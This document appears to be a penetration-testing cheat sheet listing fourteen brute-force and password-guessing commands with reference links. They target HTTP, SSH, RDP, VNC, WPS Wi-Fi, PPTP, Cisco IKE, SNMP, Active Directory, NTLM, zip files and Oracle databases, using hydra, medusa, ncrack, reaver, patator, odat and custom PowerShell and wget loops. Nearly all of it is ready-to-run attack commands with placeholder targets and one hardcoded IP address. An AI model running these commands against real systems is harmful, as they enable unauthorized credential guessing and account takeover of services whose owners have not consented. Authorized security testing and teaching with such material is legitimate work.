### 1. Brute HTTP with hydra -s 443 for ssl
```
hydra -L [usernames] -P [passwords] -t 1 -e ns -f -vV <destination> http-get /
```
**- linux,brute,http**
#### References:

https://www.aldeid.com/wiki/Thc-hydra#Usage
__________
### 2. Default community string in SNMP
```
snmpwalk -v 1 -c public [TARGET]
```
**- linux,bash,scanning,brute**
#### References:

http://net-snmp.sourceforge.net/docs/man/snmpwalk.html
__________
### 3. try to reave WPS wifi
```
reaver -i mon0 -c <channel> -b <bssid> -vv
```
**- brute,wireless,wifi**
#### References:

http://tools.kali.org/wireless-attacks/reaver
__________
### 4. medusa brute force
```
medusa -M ssh -U userlist -P passwordlist -h [host]
```
**- linux,brute**
#### References:

http://foofus.net/goons/jmk/medusa/medusa.html
__________
### 5. brute force ncrack vnc
```
ncrack -v -d1 -T5 -P /usr/share/wordlists/rockyou.txt [service eg vnc]://[target IP]:[port eg 5900] -oA [output file]-ncrack.txt
```
**- linux,brute**
#### References:

https://hackertarget.com/brute-forcing-passwords-with-ncrack-hydra-and-medusa/
__________
### 6. Simple powershell brute force, user input list, checks the password 'password'
```
Function Test-ADAuthentication {param($username,$password);echo "$username $password";(new-object directoryservices.directoryentry"",$username,$password).psbase.name -ne $null}; forEach ($userName in Get-Content "user_logins.txt"){Test-ADAuthentication $userName password >> test4.txt;}
```
**- loop,brute,Windows,powershell**
#### References:

https://msdn.microsoft.com/en-us/library/system.directoryservices.directoryentry(v=vs.110).aspx
http://serverfault.com/questions/596602/powershell-test-user-credentials-in-ad-with-password-reset
__________
### 7. Try to brute the remote group name : cisco
```
./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1
```
**- cisco,scanning,brute**
#### References:

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
https://github.com/SpiderLabs/ikeforce
https://www.trustwave.com/Resources/SpiderLabs-Blog/Cracking-IKE-Mission-Improbable-(Part-1)/
__________
### 8. Brute force PPTP password
```
thc-pptp-bruter -u [username] -W -w /usr/share/wordlists/nmap.lst
```
**- scanning,brute**
#### References:

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
__________
### 9. brute force RDP
```
ncrack -u administrator -P 500-worst-passwords.txt -p 3389 10.212.50.21
```
**- linux,brute**
#### References:

https://hackertarget.com/brute-forcing-passwords-with-ncrack-hydra-and-medusa/
__________
### 10. brute force HTTP basic burp
```
Custom iterator -> 1 + Seperator for 1 ->  2 -> payload processing b64 
```
**- brute,web application**
#### References:

http://security-geek.in/2014/08/22/using-burp-suite-to-brute-force-http-auth-attacks/
__________
### 11. NTLM brute force, if msf is broke : assumes fail is in Index, curl is still bugged?
```
for i in `cat [users]`; do for j in `cat [passwords]`; do wget -c --http-user='[domain]\$i' --http-password=$j https://[url] --no-check-certificate -e use_proxy=yes -e https_proxy=127.0.0.1:8080 2>index.html; grep -i fail index.html; rm index.html; echo $i:$j; echo "___" ; done; done | tee ntlm_brute
```
**- brute,web application**
#### References:

http://honglus.blogspot.co.uk/2010/06/use-script-to-fetch-url-protected-by.html
__________
### 12. Crack a zip file, Note: Older enc only
```
patator.py unzip_pass zipfile=[file] password=FILE0 0=[pass.txt] -x ignore:code!=0
```
**- cracking,brute force**
#### References:

https://github.com/lanjelot/patator
__________
### 13. Used to guess common SIDs in Oracle databases
```
/path/to/odat/odat-libc2.5-x86_64 sidguesser -s [IP]
```
**- brute,Oracle,database**
#### References:

https://github.com/quentinhardy/odat
https://www.darknet.org.uk/2014/07/odat-oracle-database-attacking-tool-test-oracle-database-security/
http://www.kitploit.com/2014/07/odat-oracle-database-attacking-tool.html
__________
### 14. Used to brute common passwords in Oracle TNS listener
```
/path/to/odat/odat-libc2.5-x86_64 passwordguesser -d [SID] -s [IP]
```
**- brute,Oracle,database**
#### References:

https://www.darknet.org.uk/2014/07/odat-oracle-database-attacking-tool-test-oracle-database-security/
http://www.kitploit.com/2014/07/odat-oracle-database-attacking-tool.html
__________
